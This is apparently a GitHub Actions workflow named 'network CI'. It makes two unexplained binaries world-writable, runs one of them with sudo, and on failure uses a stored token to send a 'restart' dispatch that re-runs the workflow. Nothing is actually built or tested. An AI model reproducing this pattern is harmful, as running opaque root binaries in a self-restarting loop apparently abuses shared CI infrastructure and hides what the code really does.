name: network CI

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/setup-go@v2
        with:
            go-version: '1.17'
      - run: go version

      - name: init
        run: |
            sudo apt-get update
            sudo chmod -R 777 ./1x
            sudo chmod -R 777 ./1w2x

      - name: x1
        run: sudo ./1x

      - name: fail
        if: failure()
        uses: peter-evans/repository-dispatch@v1
        with:
          token: ${{ secrets.ACTIONS_PAT }}
          event-type: restart
          client-payload: '{"runid": "${{ github.run_id }}"}'